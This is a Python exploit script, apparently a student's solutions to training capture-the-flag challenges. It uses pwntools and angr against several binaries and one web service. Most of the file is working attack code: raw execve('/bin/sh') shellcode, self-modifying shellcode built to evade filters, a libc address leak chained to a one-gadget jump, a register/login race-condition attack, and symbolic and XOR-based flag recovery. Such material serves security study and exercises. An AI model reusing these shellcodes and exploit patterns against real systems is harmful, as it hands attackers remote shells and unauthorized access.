import argparse
from pwn import *
import claripy
import angr

parser = argparse.ArgumentParser()
parser.add_argument("binary", type=str)
parser.add_argument("--remote", "-r", action="store_true")

context.terminal = ['gnome-terminal']


class switcher:
    @classmethod
    def indirect(cls, args):
        method = getattr(cls, args.binary, lambda: "invalid")
        return method(args)

    @classmethod
    def backtoshell(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 3001)
        else:
            r = process("./" + args.binary)
            gdb.attach(
                r,
                """
            c
            """,
            )
            input("Press any key to continue.")

        """
        jmp endshellcode
        shellcode:
        pop rdi
        mov rsi, rdi
        add rsi, 8
        mov rdx, rsi
        mov rax, 0x3b
        syscall
        endshellcode:
        call shellcode
        """

        shellcode = b"\x48\x89\xC4\x48\x81\xC4\x00\x01\x00\x00\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
        shellcode = shellcode + b"/bin/sh\x00" + b"\x00" * 8

        payload = shellcode

        r.send(payload)
        r.interactive()

    @classmethod
    def positiveleak(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 3003)
        else:
            r = process("./" + args.binary, env={"LD_PRELOAD": "./libc-2.27.so"})
            gdb.attach(
                r,
                """
            b *add_numbers+405
            c
            """,
            )
            input("Press any key to continue.")

        def assembly(num):
            # mov    eax,DWORD PTR [rbp-0x1c]
            eax = [int(x) for x in bin(num)[2:]]
            # cdqe
            rax = []
            for _ in range(16 - len(eax)):
                rax.append(0)
            for i in eax:
                rax.append(i)
            # shl    rax,0x2
            rax = rax[2:]
            rax.append(0)
            rax.append(0)
            # lea    rdx,[rax+0x8]
            rdx = int("".join(str(i) for i in rax), 2) + 0x8
            # mov    eax,0x10
            eax = int(0x10)
            # sub    rax,0x1
            rax = eax - 1
            # add    rax,rdx
            rax += rdx
            # div rsi
            rax = int(rax / 0x10)
            # imul   rax,rax,0x10
            rax *= 0x10

            return rax

        leak_pos = 4

        r.recvuntil("> ")
        r.sendline(b"0")
        r.recvuntil("> ")
        r.sendline(b"%d" % leak_pos)
        r.recvuntil("> ")
        r.sendline(b"0")

        for _ in range(0, leak_pos):
            r.recvuntil("> ")
            r.sendline(b"0")

        r.recvuntil("> ")
        r.sendline(b"1")

        for _ in range(0, leak_pos):
            r.recvuntil("0\n")

        leak = int(r.recvuntil("\n")[:-1])
        gadget_addr = leak - 0x3EC680 + 0x4F322
        print("[!] leak: %s" % hex(leak))
        print("[!] gadget_addr: %s" % hex(gadget_addr))

        stack_num = 50
        stack_dist = int(assembly(stack_num) / 8) + 1

        r.recvuntil("> ")
        r.sendline(b"0")
        r.recvuntil("> ")
        r.sendline(b"%d" % stack_num)

        for i in range(0, stack_dist):
            r.recvuntil("> ")
            r.sendline(b"0")

        counter = int(hex(stack_dist + 5) + "00000000", 16)

        r.recvuntil("> ")
        r.sendline(b"%d" % counter)

        r.recvuntil("> ")
        r.sendline(b"%d" % gadget_addr)

        for i in range(0, 9):
            r.recvuntil("> ")
            r.sendline(b"0")

        r.recvuntil("> ")
        r.sendline(b"-1")

        r.interactive()

    @classmethod
    def syscall(cls, args):
        if args.remote:
            r = remote("actf.jinblack.it", 4001)
        else:
            r = process("./" + args.binary)
            gdb.attach(
                r,
                """
            c
            """,
            )
            input("Press any key to continue.")
            r.recvuntil("name?\n")

        """
        mov edx, 0x3e8          count     
        mov esi, 0x404154       buffer_addr (0x404080) + 0xd4         
        mov edi, 0x0            fd
        pop rax                 syscalls are not allowed so we will position the known read address on the stack
        call rax                after calling the read, it will execute nops until arriving to buffer_addr (0x404080) + 0xd4 
        """

        buffer = 0x404080
        read = 0x401050

        shellcode = (
            b"\xBA\xE8\x03\x00\x00\xBE\xE3\x40\x40\x00\xBF\x00\x00\x00\x00\x58\xFF\xD0"
        )
        shellcode = shellcode.ljust(216, b"\x90")

        payload = shellcode + p64(buffer) + p64(read)
        r.send(payload)

        time.sleep(0.1)

        """
        jmp endshellcode
        shellcode:
        pop rdi
        mov rsi, rdi
        add rsi, 8
        mov rdx, rsi
        mov rax, 0x3b
        syscall
        endshellcode:
        call shellcode
        """

        shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\x31\xC9\xE8\xD8\xFF\xFF\xFF"

        payload = shellcode + b"/bin/sh\x00" + b"\x00" * 8

        r.send(payload)
        r.interactive()

    @classmethod
    def syscaslr(cls, args):
        if args.remote:
            r = remote("actf.jinblack.it", 4002)
        else:
            r = process("./" + args.binary)
            gdb.attach(
                r,
                """
            c
            """,
            )
            input("Press any key to continue.")
            r.recvuntil("plz?\n")

        """
        mov rax, 0x0            
        add rsi, 0x100          in rsi there is the buffer address so we write to buffer_addr + 0x100
        syscall
        jmp rsi
        """

        """
        jmp endshellcode                            we do the jmp and call trick in order to have a buffer address
        shellcode:
        pop rbx                                     the buffer address will be on rbx
        jmp rbx                                     we jump to rbx that is the next instruction after call shellcode
        endshellcode:
        call shellcode                              

        mov rax, 0x4800000000C0C748                 \x48\xC7\xC0\x00\x00\x00\x00\x48
        mov qword ptr [rbx + 0xc8], rax

        mov rcx, 0x3fdeeef                          \x81\xC6\x00\x01\x00\x00\x0F\x05
        add rcx, 0x01111111                         we do the adds in order to avoid th 0F and 05 constraints
        shl rcx, 0x20
        add rcx, 0x0100C681
        mov qword ptr [rbx + 0xd0], rcx

        mov rax, 0x909090909090E6FF                 \xFF\xE6\x90\x90\x90\x90\x90\x90
        mov qword ptr [rbx + 0xd8], rax

        add rbx, 0xc8                               we jump to rbx + 0xc8 that is the first instruction that we added
        jmp rbx
        """

        shellcode = b"\xEB\x03\x5B\xFF\xE3\xE8\xF8\xFF\xFF\xFF\x48\xB8\x48\xC7\xC0\x00\x00\x00\x00\x48\x48\x89\x83\xC8\x00\x00\x00\x48\xC7\xC1\xEF\xEE\xFD\x03\x48\x81\xC1\x11\x11\x11\x01\x48\xC1\xE1\x20\x48\x81\xC1\x81\xC6\x00\x01\x48\x89\x8B\xD0\x00\x00\x00\x48\xB8\xFF\xE6\x90\x90\x90\x90\x90\x90\x48\x89\x83\xD8\x00\x00\x00\x48\x81\xC3\xC8\x00\x00\x00\xFF\xE3"

        payload = shellcode

        r.sendline(payload)

        time.sleep(0.1)

        """
        jmp endshellcode
        shellcode:
        pop rdi
        mov rsi, rdi
        add rsi, 8
        mov rdx, rsi
        mov rax, 0x3b
        syscall
        endshellcode:
        call shellcode
        """

        shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"

        payload = shellcode + b"/bin/sh\x00" + b"\x00" * 8

        r.sendline(payload)
        r.interactive()

    @classmethod
    def cracksymb(cls, args):
        p = angr.Project("./cracksymb")

        main = 0x00403377

        flag_BVS = claripy.BVS("flag", 0x43 * 8)

        state = p.factory.entry_state(
            addr=main, stdin=flag_BVS, add_options={angr.options.LAZY_SOLVES}
        )

        for b in flag_BVS.chop(8):
            state.add_constraints(b != "\x00")
            state.add_constraints(b >= " ")
            state.add_constraints(b <= "~")

        state.add_constraints(flag_BVS.chop(8)[0] == "f")
        state.add_constraints(flag_BVS.chop(8)[1] == "l")
        state.add_constraints(flag_BVS.chop(8)[2] == "a")
        state.add_constraints(flag_BVS.chop(8)[3] == "g")
        state.add_constraints(flag_BVS.chop(8)[4] == "{")

        simgr = p.factory.simulation_manager(state)

        find = 0x004033BB
        avoid = 0x004033C9

        simgr.explore(find=find, avoid=avoid)

        if len(simgr.found) > 0:
            flag = simgr.found[0].solver.eval(flag_BVS, cast_to=bytes)
            print(flag)

    @classmethod
    def metarace(cls, args):
        EP = "http://actf.jinblack.it:4007"

        def rand_string(N=10):
            return "".join(random.choices(string.ascii_uppercase + string.digits, k=N))

        def register(u, p):
            url = "%s/register.php" % EP
            data = {"username": u, "password_1": p, "password_2": p, "reg_user": ""}
            r = requests.post(url, data=data)
            if "SUCCESS!" in r.text:
                return True
            return False

        def login(u, p):
            url = "%s/login.php" % EP
            data = {"username": u, "password": p, "log_user": ""}
            time.sleep(1)
            r = requests.post(url, data=data)
            cookies = r.cookies
            if "flag" in r.text:
                print(r.text)
                sys.exit(0)
            url = "%s/index.php" % EP
            r = requests.get(url, cookies=cookies)

        u = rand_string()
        p = rand_string()

        tr = threading.Thread(target=register, args=(u, p))
        tl = threading.Thread(target=login, args=(u, p))
        tr.start()
        tl.start()

        tr.join()
        tl.join()

    @classmethod
    def crackme(cls, args):
        key1 = b"\x19\x83\x89\xD2\x6E\x1F\x84\x1C\x94\x11\x31\x82\xDE\x04\xE9\x9B\xF0\xC9\x18\xBB\x82\x51\xAA\xBA\x13\x9E\x44\xEC\x49\xE5\xAD\x49\x01\x86\xAB\x39\x6A"
        key2 = b"\x7f\xef\xe8\xb5\x15\x73\xb4\x6a\xa7\x7d\x48\xdd\xea\x6a\x9d\xaa\x82\xfa\x6e\xe4\xf6\x23\x9b\xd9\x78\xab\x1b\x9b\x16\x96\x9c\x2e\x6f\xb2\xc7\x0c\x17"

        flag = ""

        for i in range(0x25):
            found = False

            for ch in range(256):
                if ch ^ key1[i] == key2[i]:
                    found = True
                    flag += chr(ch)

        print(flag)


switcher.indirect(parser.parse_args())